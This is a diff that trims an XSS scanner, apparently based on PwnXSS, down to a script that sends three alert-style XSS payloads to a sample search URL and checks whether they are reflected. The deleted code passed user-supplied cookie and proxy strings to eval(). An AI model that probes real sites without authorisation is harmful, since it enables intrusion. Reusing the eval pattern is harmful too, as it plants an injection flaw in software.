@@ -1,36 +1,15 @@
-import argparse
 import requests
 from urllib.parse import urlencode
-from random import randint
-from lib.helper.helper import *
-from lib.helper.Log import *
-from lib.core import *
-from lib.crawler.crawler import *
 
 # Daftar payload sederhana untuk XSS
-default_payloads = [
+payloads = [
     "<script>alert('XSS')</script>",
     "'\"><script>alert('XSS')</script>",
     "<img src=x onerror=alert('XSS')>",
 ]
 
-epilog = """
-Github: https://www.github.com/pwn0sec/PwnXSS
-Version: 0.5 Final
-"""
-
-def generate_payload(level):
-    if level >= 1 and level <= 6:
-        return default_payloads[:level]
-    else:
-        return default_payloads
-
-def scan_xss(url, payloads, method, user_agent, cookie, proxy):
+def scan_xss(url):
     results = []
-    headers = {'User-Agent': user_agent}
-    cookies = eval(cookie)
-    proxies = eval(proxy) if proxy else None
-
     print("\nStart to request URL with requests.\n")
 
     for payload in payloads:
@@ -38,24 +17,13 @@ def scan_xss(url, payloads, method, user_agent, cookie, proxy):
         full_url = f"{url}?{urlencode(params)}"
         print(f"Start to put traffic: {full_url}")
         try:
-            if method == 0 or method == 2:
-                response = requests.get(full_url, headers=headers, cookies=cookies, proxies=proxies)
-                if payload in response.text:
-                    print(f"\033[91mReflected XSS found in {full_url}\033[0m")
-                    results.append((1, "Reflected XSS", full_url))
-                else:
-                    print(f"No reflected XSS in {full_url}")
-                    results.append((0, "No XSS", full_url))
-
-            if method == 1 or method == 2:
-                response = requests.post(url, data=params, headers=headers, cookies=cookies, proxies=proxies)
-                if payload in response.text:
-                    print(f"\033[91mReflected XSS found in {full_url}\033[0m")
-                    results.append((1, "Reflected XSS", full_url))
-                else:
-                    print(f"No reflected XSS in {full_url}")
-                    results.append((0, "No XSS", full_url))
-
+            response = requests.get(full_url)
+            if payload in response.text:
+                print(f"\033[91mReflected XSS found in {full_url}\033[0m")
+                results.append((1, "Reflected XSS", full_url))
+            else:
+                print(f"No reflected XSS in {full_url}")
+                results.append((0, "No XSS", full_url))
         except Exception as e:
             print(f"Error happened: {e}")
             results.append((0, "Error", full_url))
@@ -71,49 +39,8 @@ def scan_xss(url, payloads, method, user_agent, cookie, proxy):
     print("+----+-----------------+-------------------------------------+")
     return results
 
-def check(getopt):
-    payload = int(getopt.payload_level)
-    if payload > 6 and getopt.payload is None:
-        print("Do you want to use custom payload (Y/n)?")
-        answer = input("> ")
-        if answer.lower().strip() == "y":
-            print("Write the XSS payload below")
-            payload = input("> ")
-        else:
-            payload = generate_payload(randint(1, 6))
-    else:
-        payload = generate_payload(payload)
+# URL target
+url = "http://example.com/search"
 
-    return payload if getopt.payload is None else [getopt.payload]
-
-def start():
-    parse = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,
-                                    usage="PwnXSS -u <target> [options]",
-                                    epilog=epilog,
-                                    add_help=False)
-    pos_opt = parse.add_argument_group("Options")
-    pos_opt.add_argument("--help", action="store_true", default=False, help="Show usage and help parameters")
-    pos_opt.add_argument("-u", metavar="", help="Target URL (e.g. http://testphp.vulnweb.com)")
-    pos_opt.add_argument("--payload-level", metavar="", help="Level for payload generator, 7 for custom payload. {1...6}. Default: 6", default=6)
-    pos_opt.add_argument("--payload", metavar="", help="Load custom payload directly (e.g. <script>alert(2005)</script>)", default=None)
-    pos_opt.add_argument("--method", metavar="", help="Method setting(s): \n\t0: GET\n\t1: POST\n\t2: GET and POST (default)", default=2, type=int)
-    pos_opt.add_argument("--user-agent", metavar="", help="Request user agent (e.g. Chrome/2.1.1/...)", default="Mozilla/5.0")
-    pos_opt.add_argument("--proxy", default=None, metavar="", help="Set proxy (e.g. {'https':'https://10.10.1.10:1080'})")
-    pos_opt.add_argument("--cookie", help="Set cookie (e.g {'ID':'1094200543'})", default='''{"ID":"1094200543"}''', metavar="")
-
-    getopt = parse.parse_args()
-
-    if getopt.help:
-        parse.print_help()
-        return
-
-    if getopt.u:
-        payloads = check(getopt)
-        scan_xss(getopt.u, payloads, getopt.method, getopt.user_agent, getopt.cookie, getopt.proxy)
-    else:
-        parse.print_help()
-
-if __name__ == "__main__":
-    start()
-
-python pwnxss.py -u "http://example.com/search" --payload-level 3 --method 2 --user-agent "Mozilla/5.0" --cookie '{"ID":"1094200543"}' --proxy "{'http':'http://10.10.1.10:1080'}"
+# Menjalankan pemindai XSS
+scan_xss(url)
